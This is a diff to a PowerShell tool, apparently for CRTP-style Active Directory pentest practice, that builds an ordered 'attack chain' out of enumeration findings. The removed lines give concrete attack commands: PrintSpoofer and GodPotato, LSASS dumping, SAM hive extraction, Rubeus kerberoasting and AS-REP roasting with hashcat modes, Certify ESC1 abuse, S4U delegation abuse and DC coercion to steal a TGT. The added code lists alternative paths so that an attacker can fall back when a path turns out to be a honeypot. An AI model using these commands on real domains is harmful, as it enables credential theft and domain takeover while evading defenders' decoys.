@@ -1516,59 +1516,37 @@ function Invoke-CRTPEnum {
     $ch += " ATTACK CHAIN   ->   GOAL: $goal"
     $ch += " Auto-built from THIS run's findings. Do the steps in order; each step's"
     $ch += " full command is in EXPLOIT_COMMANDS.txt / CRTP-Playbook.txt."
+    $ch += " Each phase lists ALL available paths (PRIMARY + ALTs) - if one turns out to be"
+    $ch += " a honeypot/decoy or a dead end, fall back to an ALT to save time."
     $ch += " A [GAP] step = no finding for it this run -> get that access, then re-run."
     $ch += "============================================================================"
     $sN = 0
 
-    # Step 1: local -> SYSTEM
-    $p = _pick @('Priv_SeImpersonatePrivilege','Priv_SeDebugPrivilege','Priv_SeBackupPrivilege')
-    $sN++
-    if ($p) {
-        $ch += "`n[$sN] LOCAL -> SYSTEM  on $env:COMPUTERNAME"
-        switch($p.Type){
-            'Priv_SeImpersonatePrivilege' { $ch += "     SeImpersonate:  PrintSpoofer.exe -i -c cmd.exe   (or GodPotato)" }
-            'Priv_SeDebugPrivilege'       { $ch += "     SeDebug: FindLSASSPID.exe ; minidumpdotnet.exe <pid> lsass.dmp -> creds" }
-            'Priv_SeBackupPrivilege'      { $ch += "     SeBackup: read SAM/SYSTEM hives -> secretsdump offline" }
+    # Phases 1-3: list ALL available paths per phase (PRIMARY + ALTs = honeypot fallback)
+    $phaseDefs = @(
+        @{ n='LOCAL -> SYSTEM (this host)'; types=@('Priv_SeImpersonatePrivilege','Priv_SeDebugPrivilege','Priv_SeBackupPrivilege'); gap='not admin here - run PowerUp / SharpUp / winPEAS to find a local privesc' },
+        @{ n='GET A DOMAIN CREDENTIAL';     types=@('LAPS','GMSA','GPP','Kerberoast','ASREP'); gap='none auto-found - try password spray (06b), shares (-HostSweep), or desc/info secrets' },
+        @{ n='DOMAIN PRIVILEGE ESCALATION'; types=@('ESC1','DumpTarget','ConstrainedHost','ConstrainedUser','RBCD','UnconstrainedHost'); gap='no direct primitive - abuse dangerous ACLs (07), DnsAdmins, or a cracked privileged service account' }
+    )
+    foreach($ph in $phaseDefs){
+        $opts = @()
+        foreach($ty in $ph.types){ $opts += @($expl | Where-Object { $_.Type -eq $ty }) }
+        $sN++
+        if ($opts.Count -eq 0){
+            $line = "`n[$sN] [GAP] $($ph.n): $($ph.gap)"
+            if (($ph.n -like 'LOCAL*') -and $amAdmin2){ $line += "  (note: already local admin here)" }
+            $ch += $line
+            continue
         }
-    } elseif ($amAdmin2) {
-        $ch += "`n[$sN] LOCAL: already elevated on $env:COMPUTERNAME (dump creds here if useful)."
-    } else {
-        $ch += "`n[$sN] [GAP] LOCAL: not admin here. Run PowerUp/SharpUp/winPEAS for a privesc, then continue."
-    }
-
-    # Step 2: get a domain credential
-    $p = _pick @('LAPS','GMSA','GPP','Kerberoast','ASREP')
-    $sN++
-    if ($p) {
-        $t = _tgt $p.Data
-        $ch += "`n[$sN] GET A DOMAIN CREDENTIAL  (via $($p.Type)$(if($t){" : $t"}))"
-        switch($p.Type){
-            'LAPS'       { $ch += "     use the readable LAPS local-admin password (06d_laps.txt) to log in." }
-            'GMSA'       { $ch += "     read gMSA managed password -> use its NTLM (Rubeus /rc4)." }
-            'GPP'        { $ch += "     decrypt the GPP cpassword (Get-GPPPassword / gpp-decrypt)." }
-            'Kerberoast' { $ch += "     Rubeus kerberoast /user:$t -> hashcat -m 13100 -> use the cracked password." }
-            'ASREP'      { $ch += "     Rubeus asreproast /user:$t -> hashcat -m 18200 -> use the cracked password." }
+        $ch += "`n[$sN] $($ph.n)  -  $($opts.Count) path(s) available:"
+        $i = 0
+        foreach($o in $opts){
+            $i++
+            $lbl = if ($i -eq 1) { 'PRIMARY' } else { "ALT#$i " }
+            $tt  = _tgt $o.Data
+            $ch += "      [$lbl] $($o.Type)$(if($tt){" -> $tt"})   (commands: see PER-FINDING FAST CHAINS below)"
         }
-    } else {
-        $ch += "`n[$sN] [GAP] GET A CREDENTIAL: none auto-found. Try password spray (06b), shares (-HostSweep), or desc secrets."
-    }
-
-    # Step 3: domain privilege escalation
-    $p = _pick @('ESC1','DumpTarget','ConstrainedHost','ConstrainedUser','RBCD','UnconstrainedHost')
-    $sN++
-    if ($p) {
-        $t = _tgt $p.Data
-        $ch += "`n[$sN] DOMAIN PRIVILEGE ESCALATION  (via $($p.Type)$(if($t){" : $t"}))"
-        switch($p.Type){
-            'ESC1'            { $ch += "     Certify request /template:$t /altname:administrator -> Rubeus asktgt /certificate -> DA-level." }
-            'DumpTarget'      { $ch += "     you're admin on $t where a privileged user is logged on -> dump LSASS -> steal their creds." }
-            'ConstrainedHost' { $ch += "     Rubeus s4u (host $t) /impersonateuser:administrator /ptt -> admin to that service." }
-            'ConstrainedUser' { $ch += "     Rubeus s4u (user $t) /impersonateuser:administrator /ptt." }
-            'RBCD'            { $ch += "     Rubeus s4u via a controlled acct /msdsspn:cifs/$t /ptt -> admin on $t." }
-            'UnconstrainedHost'{ $ch += "     on ${t}: Rubeus monitor + coerce a DC (MS-RPRN) -> capture the DC TGT." }
-        }
-    } else {
-        $ch += "`n[$sN] [GAP] DOMAIN PRIVESC: no direct primitive found. Abuse dangerous ACLs (07), DnsAdmins, or a cracked privileged service account."
+        if ($opts.Count -gt 1){ $ch += "      => if the PRIMARY is a decoy/honeypot or a dead end, fall back to an ALT." }
     }
 
     # Step 4: Domain Admin / krbtgt
